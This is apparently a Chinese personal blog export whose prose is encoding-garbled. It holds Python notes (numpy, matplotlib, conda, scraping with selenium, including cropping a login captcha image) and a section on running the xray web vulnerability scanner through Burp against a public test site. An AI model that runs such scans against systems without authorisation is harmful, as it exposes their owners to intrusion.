<h3 id="é«˜çº§çš„é€šç”¨å‡½æ•°ç‰¹æ€§"><a href="#é«˜çº§çš„é€šç”¨å‡½æ•°ç‰¹æ€§" class="headerlink" title="é«˜çº§çš„é€šç”¨å‡½æ•°ç‰¹æ€§"></a>é«˜çº§çš„é€šç”¨å‡½æ•°ç‰¹æ€§</h3><ol>
<li>æŒ‡å®šè¾“å‡º</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.arange(<span class="number">5</span>)</span><br><span class="line">y = np.empty(<span class="number">5</span>)</span><br><span class="line">np.multiply(x,<span class="number">10</span>,out = y)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment">#outs:[0. 10. 20. 30. 40.]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#another example</span></span><br><span class="line">y = np.zeros(<span class="number">10</span>)</span><br><span class="line">np.power(<span class="number">2</span>,x,out=y[::<span class="number">2</span>]) <span class="comment">#éš”ä¸€ä¸ªæ•°å­—åšä¹˜æ–¹</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment">#[ 1. 0. 2. 0. 4. 0. 8. 0. 16. 0.]</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>èšåˆ</li>
</ol>
<p>å¯¹äºnp.addè°ƒç”¨reduceæ–¹æ³•ä¼šè¿”å›æ‰€æœ‰çš„å…ƒç´ çš„å’Œ</p>
<p>å¯¹äºnp.multiplyå‡½æ•°è°ƒç”¨reduceä¼šè¿”å›æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ çš„ä¹˜ç§¯</p>
<p>å¦‚æœè¦å­˜å‚¨æ¯æ¬¡è®¡ç®—ä¸­é—´ç»“æœï¼Œå¯ä»¥ç”¨accumulate,åŒæ ·å¯ä»¥å¯¹addå’Œmultiplyè°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯ä¸€ä¸ªnpæ•°ç»„å¯¹è±¡ï¼Œåœ¨åŸæ¥çš„åŸºç¡€ä¸Šæœ€ååŠ ä¸Šä¸€ä¸ªå…ƒç´ å’Œæˆ–ç§¯</p>
<ol start="3">
<li>å¤–ç§¯</li>
</ol>
<p>å°±åƒä¸€ä¸ªä¹˜æ³•è¡¨ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.arange(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">np.multiply.outer(x,x)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">[1,2,3,4,5]</span></span><br><span class="line"><span class="string">[2,4,6,8,10]</span></span><br><span class="line"><span class="string">[3,6,9,12,15]</span></span><br><span class="line"><span class="string">[4,8,12,16,20]</span></span><br><span class="line"><span class="string">[5,10,15,20,25]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>





<ol>
<li></li>
</ol>
<h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><p>matplotlib æ˜¯ä¸€ä¸ªç»˜å›¾åº“ï¼Œåˆ›å»ºçš„å›¾å½¢å¯è¾¾åˆ°å‡ºç‰ˆçš„è´¨é‡è¦æ±‚ã€‚å®ƒå¯ä»¥åˆ›å»ºå¸¸ç”¨çš„ç»Ÿè®¡ å›¾ï¼ŒåŒ…æ‹¬æ¡å½¢å›¾ã€ç®±çº¿å›¾ã€æŠ˜çº¿å›¾ã€æ•£ç‚¹å›¾å’Œç›´æ–¹å›¾ã€‚å®ƒè¿˜æœ‰ä¸€äº›æ‰©å±•å·¥å…·ç®±ï¼Œæ¯”å¦‚ basemap å’Œ cartopyï¼Œç”¨äºåˆ¶ä½œåœ°å›¾ï¼Œä»¥åŠ mplot3dï¼Œç”¨äºè¿›è¡Œ 3D ç»˜å›¾ã€‚ matplotlib æä¾›äº†å¯¹å›¾å½¢å„ä¸ªéƒ¨åˆ†è¿›è¡Œå®šåˆ¶çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥è®¾ç½®å›¾å½¢çš„å½¢çŠ¶å’Œå¤§ å°ã€x è½´ä¸ y è½´çš„èŒƒå›´å’Œæ ‡åº¦ã€x è½´ä¸ y è½´çš„åˆ»åº¦çº¿å’Œæ ‡ç­¾ã€å›¾ä¾‹ä»¥åŠå›¾å½¢çš„æ ‡é¢˜ã€‚ä½ å¯ä»¥ å‚è€ƒä¸€ä¸‹ matplotlib åˆå­¦è€…æŒ‡å—å’Œ <a href="http://matplotlib.org/users/beginner.html">API</a>ï¼Œä»¥è·å¾— æ›´å¤šçš„å…³äºå®šåˆ¶å›¾å½¢çš„ä¿¡æ¯.</p>
<p>ä»ä¸€ä¸ª</p>
<p>250 2172<br>500 4230<br>750 6344<br>1000 8404<br>1250 10448<br>1500 12541<br>1750 14587<br>2000 16727<br>2250 18835<br>2500 20840<br>2750 22925<br>3000 25001<br>3250 27093<br>3500 29182<br>3750 31227è¿™æ ·çš„æ–‡ä»¶ä¸­æå–æ•°æ®å¹¶ä¸”ç»˜åˆ¶æ•£ç‚¹å›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ä¸­æ–‡å­—ä½“</span></span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;Microsoft YaHei&#x27;</span>]</span><br><span class="line">matplotlib.rcParams[<span class="string">&#x27;font.family&#x27;</span>]=<span class="string">&#x27;sans-serif&#x27;</span></span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\pycharm\gragh\/v3c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">        x.append(<span class="built_in">int</span>(row[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(row[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.scatter(x,y, label=<span class="string">&#x27;æ•£ç‚¹&#x27;</span>, color=<span class="string">&#x27;g&#x27;</span>, s=<span class="number">25</span>, marker=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">plt.ylim(<span class="number">0</span>,<span class="number">1e8</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;é—®é¢˜è§„æ¨¡n&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;æ‰§è¡Œæ¬¡æ•°(s)&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;v3æ•£ç‚¹å›¾&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>







<h2 id="ç”Ÿæˆexeå‘å¸ƒ"><a href="#ç”Ÿæˆexeå‘å¸ƒ" class="headerlink" title="ç”Ÿæˆexeå‘å¸ƒ"></a>ç”Ÿæˆexeå‘å¸ƒ</h2><ul>
<li>pyinstaller</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyinstaller -F helloworld.py</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œ<code>-F</code> è¡¨ç¤ºæ‰“åŒ…æˆå•ç‹¬çš„ .exe æ–‡ä»¶ï¼Œè¿™æ—¶ç”Ÿæˆçš„ .exe æ–‡ä»¶ä¼šæ¯”è¾ƒå¤§ï¼Œè€Œä¸”è¿è¡Œé€Ÿåº¦å›è¾ƒæ…¢ã€‚ä»…ä»…ä¸€ä¸ª helloworld ç¨‹åºï¼Œç”Ÿæˆçš„æ–‡ä»¶å°± 5MB å¤§ã€‚</p>
<p>å¦å¤–ï¼Œä½¿ç”¨ <code>-i</code> è¿˜å¯ä»¥æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„å›¾æ ‡ï¼› <code>-w</code> è¡¨ç¤ºå»æ‰æ§åˆ¶å°çª—å£ï¼Œç»™ç¨‹åºæ¢å›¾æ ‡çš„æ–¹æ³•<br>è¾“å…¥å‘½ä»¤ä¸­æ·»åŠ ä¸€ä¸ª-i tubiao.ico(å›¾æ ‡çš„ç›¸å¯¹è·¯å¾„)</p>
<h2 id="pythonä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ"><a href="#pythonä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="pythonä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ"></a>pythonä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</h2><p><code>python3 -m venv envir_name</code>å¦‚æœå®ƒä¸å­˜åœ¨ï¼Œè¿™å°†åˆ›å»º <code>tutorial-env</code> ç›®å½•ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»ºåŒ…å«Pythonè§£é‡Šå™¨ï¼Œæ ‡å‡†åº“å’Œå„ç§æ”¯æŒæ–‡ä»¶çš„å‰¯æœ¬çš„ç›®å½•ã€‚</p>
<p><code>source è™šæ‹Ÿè·¯å¾„/bin/activate</code> æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</p>
<p><code>deactivate</code>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ</p>
<h2 id="conda"><a href="#conda" class="headerlink" title="conda"></a>conda</h2><p>condaç›¸å½“äºvirtualenv + pipç¯å¢ƒ,æ˜¯ä¸€ä¸ªåŒ…ç®¡ç†å·¥å…·+è™šæ‹Ÿç¯å¢ƒçš„å·¥å…·.ä¸åªæ”¯æŒpythonä¸€ä¸ªè¯­è¨€</p>
<ol>
<li><p>é¦–å…ˆåœ¨æ‰€åœ¨ç³»ç»Ÿä¸­å®‰è£…Anacondaã€‚å¯ä»¥æ‰“å¼€å‘½ä»¤è¡Œè¾“å…¥<code>conda -V</code>æ£€éªŒæ˜¯å¦å®‰è£…ä»¥åŠå½“å‰<code>conda</code>çš„ç‰ˆæœ¬ã€‚</p>
</li>
<li><p>condaå¸¸ç”¨çš„å‘½ä»¤</p>
<ol>
<li><code>conda list</code> æŸ¥çœ‹å®‰è£…äº†å“ªäº›åŒ…ã€‚</li>
<li><code>conda env list</code> æˆ– <code>conda info -e</code> æŸ¥çœ‹å½“å‰å­˜åœ¨å“ªäº›è™šæ‹Ÿç¯å¢ƒ</li>
<li><code>conda update conda </code>æ£€æŸ¥æ›´æ–°å½“å‰<code>conda</code></li>
</ol>
</li>
<li><p><code>conda info --env</code>æŸ¥çœ‹æœ‰å“ªäº›è™šæ‹Ÿç¯å¢ƒ</p>
</li>
<li><p><strong>åˆ›å»º</strong>pythonè™šæ‹Ÿç¯å¢ƒã€‚</p>
<p>ä½¿ç”¨ <code>conda create -n your_env_name python=X.X</code>ï¼ˆ2.7ã€3.6ç­‰)å‘½ä»¤åˆ›å»ºpythonç‰ˆæœ¬ä¸ºX.Xã€åå­—ä¸ºyour_env_nameçš„è™šæ‹Ÿç¯å¢ƒã€‚<code>your_env_name</code>æ–‡ä»¶å¯ä»¥åœ¨Anacondaå®‰è£…ç›®å½•<code>envs</code>æ–‡ä»¶ä¸‹æ‰¾åˆ°ã€‚</p>
</li>
<li><p>ä½¿ç”¨<strong>æ¿€æ´»</strong>(æˆ–åˆ‡æ¢ä¸åŒpythonç‰ˆæœ¬)çš„è™šæ‹Ÿç¯å¢ƒã€‚</p>
</li>
</ol>
<p><code>conda activate env_name</code> </p>
<p>é€€å‡ºç¯å¢ƒ</p>
<p><code>conda deactivate</code></p>
<p>  æ‰“å¼€å‘½ä»¤è¡Œè¾“å…¥python â€“versionå¯ä»¥æ£€æŸ¥å½“å‰pythonçš„ç‰ˆæœ¬ã€‚</p>
<p>  ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ æ¿€æ´»ä½ çš„è™šæ‹Ÿç¯å¢ƒ(å³å°†pythonçš„ç‰ˆæœ¬æ”¹å˜)ã€‚</p>
<p>  Linux: <code>source activate your_env_name</code>(è™šæ‹Ÿç¯å¢ƒåç§°)</p>
<p>  Windows: <code>activate your_env_name</code>(è™šæ‹Ÿç¯å¢ƒåç§°)</p>
<p>  è¿™æ˜¯å†ä½¿ç”¨python â€“versionå¯ä»¥æ£€æŸ¥å½“å‰pythonç‰ˆæœ¬æ˜¯å¦ä¸ºæƒ³è¦çš„ã€‚</p>
<ol start="5">
<li>å¯¹è™šæ‹Ÿç¯å¢ƒä¸­<strong>å®‰è£…</strong>é¢å¤–çš„<strong>åŒ…</strong>ã€‚</li>
</ol>
<p>  ä½¿ç”¨å‘½ä»¤<code>conda install -n your_env_name [package]</code>å³å¯å®‰è£…packageåˆ°<code>your_env_name</code>ä¸­</p>
<ol start="6">
<li><strong>å…³é—­</strong>è™šæ‹Ÿç¯å¢ƒ(å³ä»å½“å‰ç¯å¢ƒé€€å‡ºè¿”å›ä½¿ç”¨PATHç¯å¢ƒä¸­çš„é»˜è®¤pythonç‰ˆæœ¬)ã€‚</li>
</ol>
<p>  ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ã€‚</p>
<p>  Linux: source deactivate</p>
<p>  Windows: deactivate</p>
<ol start="7">
<li><strong>åˆ é™¤</strong>è™šæ‹Ÿç¯å¢ƒã€‚</li>
</ol>
<p>  ä½¿ç”¨å‘½ä»¤<code>conda remove -n your_env_name(è™šæ‹Ÿç¯å¢ƒåç§°) --all</code>ï¼Œ å³å¯åˆ é™¤ã€‚</p>
<ol start="8">
<li><strong>åˆ é™¤</strong>ç¯å¢ƒä¸­çš„æŸä¸ª<strong>åŒ…</strong>ã€‚</li>
</ol>
<p>  ä½¿ç”¨å‘½ä»¤<code>conda remove --name your_env_name package_name </code>å³å¯ã€‚</p>
<p><code>conda</code>æ·»åŠ æº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"><span class="comment"># ä»¥ä¸Šä¸¤æ¡æ˜¯Anacondaå®˜æ–¹åº“çš„é•œåƒ</span></span><br><span class="line"></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line"><span class="comment"># ä»¥ä¸Šæ˜¯Anacondaç¬¬ä¸‰æ–¹åº“ Conda Forgeçš„é•œåƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for linux</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br><span class="line"><span class="comment"># for legacy win-64</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/peterjc123/</span><br><span class="line">ä»¥ä¸Šä¸¤æ¡æ˜¯Pytorchçš„Anacondaç¬¬ä¸‰æ–¹é•œåƒ</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes  <span class="comment">#åˆ·æ–°æº</span></span><br></pre></td></tr></table></figure>

<p><code>conda info</code>å¯ä»¥æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸ</p>
<h1 id="çˆ¬è™«"><a href="#çˆ¬è™«" class="headerlink" title="çˆ¬è™«"></a>çˆ¬è™«</h1><h2 id="bs4"><a href="#bs4" class="headerlink" title="bs4"></a>bs4</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup </span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(web_response.content,<span class="string">&quot;html.parser&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/">https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/</a></p>
<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">web = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)  <span class="comment">#å‘ç™¾åº¦å‘èµ·ä¸€æ¬¡getè¯·æ±‚ï¼Œè¿”å›è¯·æ±‚ç»“æœçš„å®ä½“ç±»</span></span><br><span class="line"><span class="built_in">print</span>(web.status_code)    <span class="comment">#è¯·æ±‚è¿”å›çš„çŠ¶æ€ç ï¼Œ200æ˜¯OKï¼Œ404æ˜¯é¡µé¢ä¸å­˜åœ¨ï¼Œ500æ˜¯é”™è¯¯ï¼Œæ›´å¤šè‡ªå·±ç™¾åº¦æœç´¢</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(web.content))    <span class="comment">#é¡µé¢å†…å®¹çš„æ•°æ®ç±»å‹æ˜¯bytesï¼Œå› æ­¤éœ€è¦è§£ç </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(web.content.decode()))</span><br><span class="line"><span class="built_in">print</span>(web.content.decode())    <span class="comment">#è§£ç ä¹‹åï¼Œå¾—åˆ°çš„é¡µé¢å†…å®¹æ˜¯ç»“æ„åŒ–çš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>



<h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment"># å¯ä»¥è¿›è¡Œchromeç›¸å…³åŒ…çš„è‡ªåŠ¨ä¸‹è½½å’Œç®¡ç†</span></span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">element_screenshot</span>(<span class="params">element</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    æˆªå–éƒ¨åˆ†æˆªå›¾,æ ¹æ®domå…ƒç´ çš„idè·å–</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pwd = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    os.chdir(pwd)</span><br><span class="line">    <span class="comment"># æˆªå–å…¨å±å›¾ç‰‡</span></span><br><span class="line">    <span class="comment"># driver.set_window_size(1920,1080)</span></span><br><span class="line">    driver.save_screenshot(<span class="string">&quot;../images/full.png&quot;</span>)</span><br><span class="line">    <span class="comment"># è·å–elementçš„é¡¶ç‚¹åæ ‡</span></span><br><span class="line">    x_Piont = element.location[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">    y_Piont = element.location[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(x_Piont + &quot; &quot; + y_Piont)</span></span><br><span class="line">    <span class="comment"># è·å–elementçš„å®½ã€é«˜</span></span><br><span class="line">    element_width = x_Piont + element.size[<span class="string">&#x27;width&#x27;</span>]</span><br><span class="line">    element_height = y_Piont + element.size[<span class="string">&#x27;height&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    picture = Image.<span class="built_in">open</span>(<span class="string">&quot;../images/full.png&quot;</span>)</span><br><span class="line">	<span class="comment"># æ­¤å¤„çš„125æ˜¯ç¼©æ”¾æ¯”,windowsæ¡Œé¢å³é”®-æ˜¾ç¤ºè®¾ç½®ä¸­çš„ç¼©æ”¾æ¯”æ•°å€¼,åªæœ‰é™¤ä»¥(100/125)åæ ‡æ‰å¯ä»¥æ˜¾ç¤ºæ­£å¸¸</span></span><br><span class="line">    picture = picture.crop((x_Piont/(<span class="number">100</span>/<span class="number">125.0</span>), y_Piont/(<span class="number">100</span>/<span class="number">125.0</span>), element_width/(<span class="number">100</span>/<span class="number">125.0</span>), element_height/(<span class="number">100</span>/<span class="number">125.0</span>)))</span><br><span class="line">    picture.save(<span class="string">&quot;../images/Capture.png&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># ä¸€ä¸ªæ–°çš„è¿æ¥,å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”ç‰ˆæœ¬çš„é©±åŠ¨ä¼šè‡ªåŠ¨å®‰è£… ,æ³¨æ„Chromeæ˜¯å¤§å†™å­—æ¯å¼€å¤´</span></span><br><span class="line">driver = webdriver.Chrome(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver.get(<span class="string">&quot;http://192.168.100.190//default2.aspx&quot;</span>)</span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># è¦æˆªå–çš„éªŒè¯ç å…ƒç´ </span></span><br><span class="line">element = driver.find_element_by_id(<span class="string">&quot;icode&quot;</span>)</span><br><span class="line"><span class="comment"># è°ƒç”¨element_screenshot()æ–¹æ³•</span></span><br><span class="line">element_screenshot(element)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>xpathå®šä½æ³•</p>
<p>å’Œæœ¬æ–‡æ¡£åŒä¸€ç›®å½•ä¸‹çš„pdf</p>
</li>
</ul>
<h3 id="è½¬ä¸­æ–‡é—®é¢˜"><a href="#è½¬ä¸­æ–‡é—®é¢˜" class="headerlink" title="è½¬ä¸­æ–‡é—®é¢˜"></a>è½¬ä¸­æ–‡é—®é¢˜</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line">json.dumps(éœ€è¦è½¬æˆjsonå¯¹è±¡,ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>



<h3 id="åœ¨flaskä¸­ä½¿ç”¨log"><a href="#åœ¨flaskä¸­ä½¿ç”¨log" class="headerlink" title="åœ¨flaskä¸­ä½¿ç”¨log"></a>åœ¨flaskä¸­ä½¿ç”¨log</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">handler = logging.FileHandler(<span class="string">&#x27;flask.log&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">handler.setLevel(logging.DEBUG) <span class="comment"># è®¾ç½®æ—¥å¿—è®°å½•æœ€ä½çº§åˆ«ä¸ºDEBUGï¼Œä½äºDEBUGçº§åˆ«çš„æ—¥å¿—è®°å½•ä¼šè¢«å¿½ç•¥ï¼Œä¸è®¾ç½®setLevel()åˆ™é»˜è®¤ä¸ºNOTSETçº§åˆ«ã€‚</span></span><br><span class="line">logging_format = logging.Formatter(     </span><br><span class="line">    <span class="string">&#x27;%(asctime)s - %(levelname)s - %(filename)s - %(funcName)s - %(lineno)s - %(message)s&#x27;</span>)</span><br><span class="line">handler.setFormatter(logging_format)</span><br><span class="line">flask_app.logger.addHandler(handler)</span><br></pre></td></tr></table></figure>

<p><code>flask_app.logger.duebg()</code>å³å¯è®°å½•flask</p>
<p>flask_appä¸ºflaskå®ä¾‹    </p>
<h3 id="ç”Ÿæˆrequirement-txt"><a href="#ç”Ÿæˆrequirement-txt" class="headerlink" title="ç”Ÿæˆrequirement.txt"></a>ç”Ÿæˆrequirement.txt</h3><p><code>pip freezz &gt; requiremets.txt</code></p>
<p><code>pipreqs ./</code></p>
<h3 id="ä½¿ç”¨vscodeå¯¼å…¥ç›¸å¯¹è·¯å¾„"><a href="#ä½¿ç”¨vscodeå¯¼å…¥ç›¸å¯¹è·¯å¾„" class="headerlink" title="ä½¿ç”¨vscodeå¯¼å…¥ç›¸å¯¹è·¯å¾„"></a>ä½¿ç”¨vscodeå¯¼å…¥ç›¸å¯¹è·¯å¾„</h3><p>pycharmä¼šè‡ªåŠ¨æ·»åŠ é¡¹ç›®æ ¹ç›®å½•åˆ°å·¥ä½œè·¯å¾„ï¼Œvscode éœ€è¦ä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶,ä¸ç„¶ä¼šno moudle error</p>
<p>åœ¨lau nch.jsonä¸­æ·»åŠ </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;env&quot;</span>: &#123;<span class="attr">&quot;PYTHONPATH&quot;</span>:<span class="string">&quot;$&#123;workspaceRoot&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>åŸºç¡€è¯­æ³•</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Webæ‰«æå™¨å·¥å…·æ•´ç†</title>
    <url>/2021/11/11/web%E6%89%AB%E6%8F%8F%E5%99%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>ç»§ç»­æ•´ç†æœ€è¿‘æ–°æ¥è§¦çš„å·¥å…·ï¼ŒWebæ‰«æå™¨ä¸“åœº,xrayå’Œvulmapä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡</p>
<span id="more"></span>

<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a><a href="https://github.com/chaitin/xray">xray</a></h2><p>ä¸‰ç§æ¨¡å¼</p>
<p>ç›´æ¥æ‰«å•ä¸ªç«™</p>
<p><code>./xray webscan --url xxx.com</code></p>
<h3 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h3><p><code>./xray webscan --url xxx.com --listen 127.0.0.1:7777</code></p>
<ul>
<li>é…ç½®ç›®æ ‡ç«™ç‚¹</li>
</ul>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609521088-2021-11-1113:45:21.png"></p>
<p><strong>å€¼å¾—æ³¨æ„çš„æ˜¯å®˜æ–¹æä¾›çš„ä¾‹å­ä¸­è¿™ä¸ªawvsçš„é¶åœºä¼¼ä¹å·²ç»è¢«å¢™ï¼Œæ‰€ä»¥éœ€è¦åœ¨<code>config.yml</code>é…ç½®ä¸­æ·»åŠ <code>proxy</code>,é…ç½®å…¶ä¸Šæ¸¸ä»£ç†ç„¶åå°±èƒ½æ­£å¸¸è®¿é—®</strong></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609356730-2021-11-1113:42:36.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636608914853-2021-11-1113:35:14.png"></p>
<h4 id="ç»“åˆbpä½¿ç”¨"><a href="#ç»“åˆbpä½¿ç”¨" class="headerlink" title="ç»“åˆbpä½¿ç”¨"></a>ç»“åˆbpä½¿ç”¨</h4><blockquote>
<p>å› ä¸ºæ›´å¤šçš„ä½¿ç”¨åœºæ™¯åœ¨äºä¸€è¾¹æµè§ˆæµè§ˆå™¨xrayä¸€è¾¹åˆ†æï¼Œæ‰€ä»¥ç»“åˆbpæ¥è¿›è¡Œå¾ˆæœ‰å¿…è¦</p>
</blockquote>
<p>å¯åŠ¨å‘½ä»¤ä»£ç†æ¨¡å¼ä¸€æ ·ï¼Œéœ€è¦åœ¨bpé‡Œé¢åŠ ä¸€ä¸ªä¸Šæ¸¸ä»£ç†</p>
<p><strong>bpä¸­ä¸Šæ¸¸ä»£ç†å’Œsocksä»£ç†ä¸èƒ½æ··ç”¨</strong></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609172503-2021-11-1113:39:32.png"></p>
<p>æ‰€ä»¥ç”¨ä¸Šäº†bpä¹‹ååŠ ä¸Šä¹‹å‰xrayçš„ä¸Šæ¸¸ä»£ç†å½¢æˆäº†ä¸€æ¡ä»£ç†é“¾</p>
<p><code>socks5://127.0.0.1:1080(æˆ‘çš„v2rayä»£ç†)</code>&gt;<code>http://127.0.0.1:7777(æˆ‘çš„xrayä»£ç†)</code>&gt;<code>http://127.0.0.1:10086(æˆ‘çš„bpä»£ç†)</code></p>
<p>ä¸éœ€è¦xrayæœ¬èº«ä»£ç†çš„æ—¶å€™å¯ä»¥æŠŠç¬¬ä¸€æ¡å»æ‰ï¼Œè€Œé…ç½®æ–‡ä»¶ä¸­è¿˜æœ‰å¯¹è¯·æ±‚æœ¬èº«çš„ä»£ç†é…ç½®ï¼Œä¸åœ¨èµ˜è¿°ï¼Œéœ€è¦ç”¨æ—¶ç¿»æ–‡æ¡£å°±è¡Œ</p>
<h3 id="çˆ¬è™«æ¨¡å¼"><a href="#çˆ¬è™«æ¨¡å¼" class="headerlink" title="çˆ¬è™«æ¨¡å¼"></a>çˆ¬è™«æ¨¡å¼</h3><p>å¹¶ä¸”è¾“å‡ºhtmlæ ¼å¼çš„æŠ¥å‘Š</p>
<ul>
<li>xrayä¸èƒ½å¤„ç†jsæ¸²æŸ“</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure>

<p><strong>å¦‚æœéœ€è¦ç™»å½•ç½‘ç«™éœ€è¦æ‰‹åŠ¨è®¾ç½®cookie,åœ¨é…ç½®æ–‡ä»¶<code>http</code>çš„<code>Hearders</code>ä¸­</strong></p>
